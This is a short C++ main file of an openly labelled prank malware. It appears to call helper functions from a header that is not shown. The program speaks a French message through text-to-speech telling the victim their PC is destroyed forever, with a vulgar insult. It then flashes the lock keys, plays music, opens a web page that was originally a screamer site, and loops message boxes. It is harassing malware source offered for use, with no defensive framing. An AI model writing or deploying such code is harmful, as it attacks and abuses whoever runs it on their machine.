#include "../header/main.h"
#include <iostream>
#include <thread>
#include <Windows.h>




int main() {


    // La petite voix
    Sapi(L"Coucou, je suis juste la petite voix qui te dit que le 18 25 vient de détruire ton PC et ce à tout jamais. Amuse toi bien à le réparer fils de viol, très content. Dédi au rhey du 18 25.");
    
    
            


    // Faire clignoter les touches de verrouillage
    std::thread caps(CapsLock);
    caps.detach();

    // La musique 
    std::thread music(Music);
    music.detach();


             // Renvoyer l'utilisateur sur une page web de votre choix..
           // .. Le malware original renvoie au screamer cactus aujourd'hui obsolète (http://0xad.net/cactus)

    std::thread cactus(Cactus); 
    cactus.detach();      

    Loop_MsgBox();

    std::cin.ignore();
    return 0;

}